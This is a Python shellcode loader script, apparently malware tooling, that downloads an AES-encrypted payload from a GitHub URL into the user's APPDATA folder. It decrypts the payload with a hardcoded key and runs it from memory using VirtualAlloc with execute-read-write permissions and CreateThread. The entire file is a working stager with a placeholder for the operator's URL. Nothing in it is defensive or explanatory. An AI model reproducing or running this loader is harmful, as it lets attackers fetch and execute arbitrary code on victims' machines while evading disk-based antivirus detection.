# run_payload.py
import os, requests, ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from pathlib import Path

# === Config (must match encrypt_bin.py) ===
key = b'0123456789ABCDEF0123456789ABCDEF'
iv  = b'1234567890ABCDEF'

# === Direct URL to your encrypted payload ===
url = "https://github.com/meechtrades/3clicker/raw/refs/heads/main/payloadencrypted.bin"   # <-- put your URL here

# === Download encrypted file to AppData ===
appdata = Path(os.getenv("APPDATA") or os.getenv("TEMP"))
enc_path = appdata / "payloadencrypted.bin"
print(f"[+] Downloading to {enc_path}")

resp = requests.get(url)
resp.raise_for_status()
enc_data = resp.content

if len(enc_data) < 100:
    raise ValueError(f"Downloaded file is suspiciously small ({len(enc_data)} bytes)")

enc_path.write_bytes(enc_data)

# === Decrypt in memory ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(enc_data), AES.block_size)

if len(decrypted) == 0:
    raise ValueError("Decrypted payload is empty (check AES key/IV or file)")

print(f"[+] Decrypted payload size: {len(decrypted)} bytes")

# === Execute shellcode from memory ===
kernel32 = ctypes.windll.kernel32

kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]

kernel32.CreateThread.restype = ctypes.c_void_p
kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
                                  ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]

kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]

ptr = kernel32.VirtualAlloc(None, len(decrypted), 0x3000, 0x40)
if not ptr:
    raise OSError("VirtualAlloc failed")

ctypes.memmove(ptr, decrypted, len(decrypted))

handle = kernel32.CreateThread(None, 0, ptr, None, 0, None)
if not handle:
    raise OSError("CreateThread failed")

print("[+] Running payload from memory...")
kernel32.WaitForSingleObject(handle, -1)
